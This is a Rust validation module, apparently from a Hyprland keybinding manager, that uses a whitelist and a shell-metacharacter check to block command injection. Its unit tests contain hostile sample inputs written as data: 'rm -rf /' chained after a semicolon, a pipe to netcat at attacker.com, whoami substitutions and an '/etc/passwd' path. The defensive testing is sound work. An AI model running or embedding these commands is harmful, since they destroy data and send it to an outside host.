// Copyright 2025 bakri (tidynest@proton.me)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Security-focused input validation
//!
//! This module implements whitelist-based validation to prevent:
//! - Shell command injection via keybinding arguments
//! - Invalid dispatcher names that could exploit Hyprland IPC
//! - Malformed key names that could cause parser issues
//!
//! # Security Philosophy
//! We use WHITELIST validation (allow known-good) rather than BLACKLIST
//! (block known-bad) because blacklists can be bypassed. Only explicitly
//! allowed dispatchers, keys, and argument formats are accepted.

use thiserror::Error;
use crate::core::types::Keybinding;

/// Validation errors
#[derive(Debug, Error, PartialEq)]
pub enum ValidationError {
    /// Dispatcher name not in whitelist
    #[error("Invalid dispatcher '{0}': not in whitelist")]
    InvalidDispatcher(String),

    /// Key name contains invalid characters
    #[error("Invalid key name '{0}'")]
    InvalidKey(String),

    /// Dangerous shell metacharacters detected in arguments
    #[error("Dangerous shell metacharacters detected in arguments: '{0}'")]
    ShellMetacharacters(String),

    /// Argument exceeds maximum length
    #[error("Argument too long: {0} characters (max 1000)")]
    ArgumentTooLong(usize),
}

/// Hyprland dispatcher whitelist
///
/// Source: https://wiki.hyprland.org/Configuring/Dispatchers/
/// Last verified: October 2025
const ALLOWED_DISPATCHERS: &[&str] = &[
    "exec",
    "execr",
    "killactive",
    "closewindow",
    "workspace",
    "movetoworkspace",
    "togglefloating",
    "fullscreen",
    "pseudo",
    "pin",
    "movefocus",
    "movewindow",
    "swapwindow",
    "centerwindow",
    "resizeactive",
    "moveactive",
    "cyclenext",
    "focuswindow",
    "focusmonitor",
    "splitratio",
    "toggleopaque",
    "movecursortocorner",
    "workspaceopt",
    "exit",
    "forcerendererreload",
    "movecurrentworkspacetomonitor",
    "focusurgentor",
    "togglespecialworkspace",
    "togglegroup",
    "changegroupactive",
    "moveintogroup",
    "moveoutofgroup",
    "lockgroups",
    "lockactivegroup",
    "movegroupwindow",
    "pass",
    "sendshortcut",
    "layoutmsg",
    "dpms",
    "submap",
    "global",
];

/// Validates dispatcher name against whitelist
pub fn validate_dispatcher(name: &str) -> Result<(), ValidationError> {
    if ALLOWED_DISPATCHERS.contains(&name.to_lowercase().as_str()) {
        Ok(())
    } else {
        Err(ValidationError::InvalidDispatcher(name.to_string()))
    }
}

/// Checks for shell metacharacters that enable command injection
///
/// Detects: ; | & $ ` ( ) { } [ ] < > \ " ' and newlines
pub fn check_shell_metacharacters(input: &str) -> Result<(), ValidationError> {
    const DANGEROUS_CHARS: &[char] = &[
        ';', '|', '&', '$', '`', '(', ')', '{', '}',
        '[', ']', '<', '>', '\\', '"', '\'', '\n', '\r',
    ];

    for ch in DANGEROUS_CHARS {
        if input.contains(*ch) {
            return Err(ValidationError::ShellMetacharacters(input.to_string()));
        }
    }

    Ok(())
}

/// Validates key name format
///
/// Accepts alphanumeric, underscores, colons, hyphens (for mouse buttons),
/// and common special keys (Return, Escape, Space, Tab, arrow keys, etc.)
pub fn validate_key(key: &str) -> Result<(), ValidationError> {
    let valid = key.chars().all(|c| c.is_alphanumeric() || c == '_' || c == ':' || c == '-')
        || matches!(
            key,
            "Return" | "Escape" | "Space" | "Tab" | "BackSpace"
            | "Delete" | "Insert" | "Home" | "End" | "Prior" | "Next"
            | "Left" | "Right" | "Up" | "Down"
        );

    if valid {
        Ok(())
    } else {
        Err(ValidationError::InvalidKey(key.to_string()))
    }
}

/// Validates complete keybinding before execution
///
/// Performs all validation checks:
/// - Dispatcher whitelist
/// - Key name format
/// - Argument length limit (1000 chars)
/// - Shell metacharacter detection
pub fn validate_keybinding(binding: &Keybinding) -> Result<(), ValidationError> {
    // Validate dispatcher against whitelist
    validate_dispatcher(&binding.dispatcher)?;

    // Validate key name
    validate_key(&binding.key_combo.key)?;

    // Validate arguments if present
    if let Some(args) = &binding.args {
        // Check length limit (prevent memory exhaustion)
        if args.len() > 1000 {
            return Err(ValidationError::ArgumentTooLong(args.len()));
        }

        // Check for shell injection attempts
        check_shell_metacharacters(args)?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::types::{BindType, KeyCombo, Modifier};

    #[test]
    fn test_valid_dispatchers() {
        assert!(validate_dispatcher("exec").is_ok());
        assert!(validate_dispatcher("workspace").is_ok());
        assert!(validate_dispatcher("killactive").is_ok());
        assert!(validate_dispatcher("togglefloating").is_ok());
    }

    #[test]
    fn test_dispatcher_case_insensitive() {
        assert!(validate_dispatcher("EXEC").is_ok());
        assert!(validate_dispatcher("Workspace").is_ok());
    }

    #[test]
    fn test_invalid_dispatcher() {
        assert_eq!(
            validate_dispatcher("evil_command"),
            Err(ValidationError::InvalidDispatcher("evil_command".to_string()))
        );
        assert_eq!(
            validate_dispatcher("rm"),
            Err(ValidationError::InvalidDispatcher("rm".to_string()))
        );
    }

    #[test]
    fn test_detects_semicolon_injection() {
        let malicious = "firefox; rm -rf /";
        assert!(matches!(
            check_shell_metacharacters(malicious),
            Err(ValidationError::ShellMetacharacters(_))
        ));
    }

    #[test]
    fn test_detects_pipe_injection() {
        let malicious = "firefox | nc attacker.com 1234";
        assert!(check_shell_metacharacters(malicious).is_err());
    }

    #[test]
    fn test_detects_backtick_injection() {
        let malicious = "firefox `whoami`";
        assert!(check_shell_metacharacters(malicious).is_err());
    }

    #[test]
    fn test_detects_dollar_sign_injection() {
        let malicious = "firefox $(whoami)";
        assert!(check_shell_metacharacters(malicious).is_err());
    }

    #[test]
    fn test_allows_safe_arguments() {
        assert!(check_shell_metacharacters("firefox").is_ok());
        assert!(check_shell_metacharacters("firefox --new-window").is_ok());
        assert!(check_shell_metacharacters("wofi --show drun").is_ok());
        assert!(check_shell_metacharacters("kitty -e nvim").is_ok());
    }

    #[test]
    fn test_valid_keys() {
        assert!(validate_key("K").is_ok());
        assert!(validate_key("Return").is_ok());
        assert!(validate_key("F1").is_ok());
        assert!(validate_key("Escape").is_ok());
        assert!(validate_key("Space").is_ok());
        assert!(validate_key("Up").is_ok());
    }

    #[test]
    fn test_invalid_keys() {
        assert!(validate_key("K;L").is_err());
        assert!(validate_key("../etc/passwd").is_err());
        assert!(validate_key("KEY WITH SPACES").is_err());
    }

    #[test]
    fn test_argument_length_limit() {
        let long_arg = "a".repeat(1001);
        let binding = Keybinding {
            key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
            bind_type: BindType::Bind,
            dispatcher: "exec".to_string(),
            args: Some(long_arg),
        };

        assert!(matches!(
            validate_keybinding(&binding),
            Err(ValidationError::ArgumentTooLong(1001))
        ));
    }

    #[test]
    fn test_validates_complete_binding_success() {
        let binding = Keybinding {
            key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
            bind_type: BindType::Bind,
            dispatcher: "exec".to_string(),
            args: Some("firefox".to_string()),
        };

        assert!(validate_keybinding(&binding).is_ok());
    }

    #[test]
    fn test_validates_complete_binding_invalid_dispatcher() {
        let binding = Keybinding {
            key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
            bind_type: BindType::Bind,
            dispatcher: "evil".to_string(),
            args: Some("firefox".to_string()),
        };

        assert!(matches!(
            validate_keybinding(&binding),
            Err(ValidationError::InvalidDispatcher(_))
        ));
    }

    #[test]
    fn test_validates_complete_binding_shell_injection() {
        let binding = Keybinding {
            key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
            bind_type: BindType::Bind,
            dispatcher: "exec".to_string(),
            args: Some("firefox; rm -rf /".to_string()),
        };

        assert!(matches!(
            validate_keybinding(&binding),
            Err(ValidationError::ShellMetacharacters(_))
        ));
    }
}
